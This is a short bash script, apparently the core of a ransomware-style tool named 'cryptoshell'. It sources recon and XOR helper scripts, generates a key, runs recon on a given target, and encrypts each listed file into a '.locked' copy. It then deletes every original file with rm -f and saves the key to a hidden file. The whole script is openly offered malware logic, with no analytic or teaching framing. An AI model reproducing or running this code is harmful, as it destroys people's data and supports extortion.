#!bin/bash

source recon.sh
source xor_helper.sh

key=$(generate_key 8)
recon "$1"
target=$(cat target.list)
for file in $target; do
    xor_file "$file" "$file.locked" "$key"
    rm -f "$file"
done
echo "$key" > .cryptoshell_key
rm -f target.list